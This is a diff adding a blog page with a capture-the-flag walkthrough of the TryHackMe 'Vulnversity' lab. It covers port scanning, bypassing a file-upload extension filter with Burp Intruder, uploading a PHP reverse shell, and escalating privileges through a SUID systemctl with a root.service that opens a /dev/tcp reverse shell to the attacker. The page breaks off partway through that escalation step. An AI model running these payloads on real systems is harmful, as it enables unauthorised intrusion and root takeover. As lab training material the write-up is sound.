@@ -1,0 +1,285 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Vulnversity | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Vulnerability from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/3_vulnversity/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Vulnversity</h1> <p class="post-description">Vulnerability from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Vulnversity Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/r/room/vulnversity" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Congratulations on your acceptance to Vulnversity.</p> <p>The first step is to run nmap to determine the open ports.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.101.216
+┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.207.42
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-06 23:06 AEDT
+Nmap scan report <span class="k">for </span>10.10.207.42
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 <span class="o">(</span>ED25519<span class="o">)</span>
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Vuln University
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Run gobuster to try and brute-force directories.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.207.42:3333 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-o</span> gobuster
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.207.42:3333
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.207.42:3333/images/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.207.42:3333/css/]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.207.42:3333/js/]
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.207.42:3333/fonts/]
+/internal             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.207.42:3333/internal/]
+Progress: 3692 / 220561 <span class="o">(</span>1.67%<span class="o">)</span>^C
+<span class="o">[!]</span> Keyboard interrupt detected, terminating.
+Progress: 3706 / 220561 <span class="o">(</span>1.68%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div> <p><br> Navigate to the /internal/ directory and notice the file upload.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/fileupload.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="File Upload Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Notice that there is some sort of file extension restriction in place that will need to be circumvented.</p> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/extnotallowed.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Extension Not Allowed" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Create a phpext.txt file with the possible php extensions that will be tested.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span><span class="nb">cat </span>phpext.txt  
+.php
+.php3
+.php4
+.php5
+.phtml
+</code></pre></div></div> <p><br> Push the traffic through Burp Suite and run the upload to generate the request.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/badrequest.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Bad Request" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> In Burp, highlight the post request and press control + i to send it to Intruder.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/highlight.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Send to Intruder" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> In Intruder, highlight the extension in the filename and press Add.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/posadd.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Positions Add" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Click on the Load… button in the Payload configuration.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/clickload.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Click load" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Choose the phpext.txt file and double-click it to select it.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/filechoose.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Choose the file" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Deselect the URL-encode these characters checkbox in the Payload encoding section.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/payloadencode.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Deselect payload encoding" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Click the start attack button to initiate the attack.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/startattack.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Start the attack" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Reviewing the results, notice that the phtml length is significantly different than the other extension.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/results.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Review the results" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Review the response and notice that it says Success.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/resultresponse.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Review the response" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">pentestmonkey reverse shell</a>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php <span class="nt">-O</span> shell.phtml
+<span class="nt">--2025-01-06</span> 23:39:45--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 2606:50c0:8001::154, 2606:50c0:8002::154, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5491 <span class="o">(</span>5.4K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘shell.phtml’
+
+shell.phtml                                                100%[<span class="o">========================================================================================================================================&gt;]</span>   5.36K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2025-01-06 23:39:45 <span class="o">(</span>48.2 MB/s<span class="o">)</span> - ‘shell.phtml’ saved <span class="o">[</span>5491/5491]
+</code></pre></div></div> <p><br> Edit the shell to update the IP address and the port for whatever you intend to use on your attack machine.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+<span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+<span class="c1">// do not use this tool.</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.4.119.29'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="cp">?&gt;</span> 
+</code></pre></div></div> <p><br> Start a listener that listens on the port specified in the payload.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                                   
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>sec: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Choose the shell.phtml file and click the submit button to upload it.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/uploadpayload.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Upload payload" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Navigate to the shell that was just uploaded.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/navshell.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Navigate to the shell" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                                   
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>sec: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.207.42] 34548
+Linux vulnuniversity 4.4.0-142-generic <span class="c">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 07:47:13 up 50 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ 
+</span></code></pre></div></div> <p><br> Use python pty to spawn a better shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+www-data@vulnuniversity:/<span class="nv">$ </span>
+</code></pre></div></div> <p><br> Cat the user.txt in the user folder and ifconfig to get the full trophy.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@vulnuniversity:/<span class="nv">$ </span><span class="nb">cat</span> /home/bill/user.txt
+<span class="nb">cat</span> /home/bill/user.txt
+&lt;redacted&gt;
+www-data@vulnuniversity:/<span class="nv">$ </span>ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:ab:3b:49:61:43  
+          inet addr:10.10.207.42  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::ab:3bff:fe49:6143/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:9211 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8545 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:908236 <span class="o">(</span>908.2 KB<span class="o">)</span>  TX bytes:8714374 <span class="o">(</span>8.7 MB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:609 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:609 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:62408 <span class="o">(</span>62.4 KB<span class="o">)</span>  TX bytes:62408 <span class="o">(</span>62.4 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Check the <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="external nofollow noopener" target="_blank">G0tmi1k</a> linux privilege escalation blog post to get the commands to get the stick bits.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-1000</span> <span class="nt">-type</span> d 2&gt;/dev/null   <span class="c"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
+find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null    <span class="c"># SGID (chmod 2000) - run as the group, not the user who started it.</span>
+find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null    <span class="c"># SUID (chmod 4000) - run as the owner, not the user who started it.</span>
+
+find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null    <span class="c"># SGID or SUID</span>
+<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span>locate <span class="nt">-r</span> <span class="s2">"bin$"</span><span class="sb">`</span><span class="p">;</span> <span class="k">do </span>find <span class="nv">$i</span> <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-type</span> f 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>    <span class="c"># Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span>
+
+<span class="c"># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span>
+find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="o">!</span> <span class="nt">-type</span> l <span class="nt">-maxdepth</span> 3 <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ld</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</code></pre></div></div> <p><br> Run the command to find the SGID or SUID.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@vulnuniversity:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+&lt;find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null                         
+/usr/local/share/sgml
+/usr/local/share/sgml/stylesheet
+/usr/local/share/sgml/entities
+/usr/local/share/sgml/dtd
+/usr/local/share/sgml/declaration
+/usr/local/share/sgml/misc
+/usr/local/share/xml
+/usr/local/share/xml/entities
+/usr/local/share/xml/schema
+/usr/local/share/xml/declaration
+/usr/local/share/xml/misc
+/usr/local/lib/python3.5
+/usr/local/lib/python3.5/dist-packages
+/usr/local/lib/python2.7
+/usr/local/lib/python2.7/site-packages
+/usr/local/lib/python2.7/dist-packages
+/usr/bin/wall
+/usr/bin/bsd-write
+/usr/bin/newuidmap
+/usr/bin/mlocate
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/screen
+/usr/bin/ssh-agent
+/usr/bin/newgidmap
+/usr/bin/crontab
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/expiry
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/run/log/journal
+/run/log/journal/8cfd988746864b75b0050f995d421653
+/var/cache/man
+/var/local
+/var/mail
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/sbin/mount.cifs
+</code></pre></div></div> <p><br> Review the results and notice the /bin/systemctl in the results list.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@vulnuniversity:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+&lt;find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null                         
+
+&lt;snip&gt;
+
+/bin/systemctl
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Check the <a href="https://gtfobins.github.io/gtfobins/systemctl/" rel="external nofollow noopener" target="_blank">gtfobins</a> for systemctl and notice the entry.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/vulnversity/systemctl.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GTFOBins" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Couldn’t get the GTFOBins process to work. So, back to the Google and found this gist from <a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740" rel="external nofollow noopener" target="_blank">A1vinSmith</a>. Create the root.service.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'[Unit]'</span> <span class="o">&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">'[Unit]'</span> <span class="o">&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Description=roooooooooot'</span> <span class="o">&gt;&gt;</span> root.service
+&lt;v/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Description=roooooooooot'</span> <span class="o">&gt;&gt;</span> root.service                      
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'[Service]'</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">'[Service]'</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Type=simple'</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">'Type=simple'</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'User=root'</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">'User=root'</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.4.119.29/9999 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> root.service     
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'[Install]'</span> <span class="o">&gt;&gt;</span> root.service
+<span class="nb">echo</span> <span class="s1">'[Install]'</span> <span class="o">&gt;&gt;</span> root.service
+www-data@vulnuniversity:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'WantedBy=multi-user.target'</span> <span class="o">&gt;&gt;</span> root.service
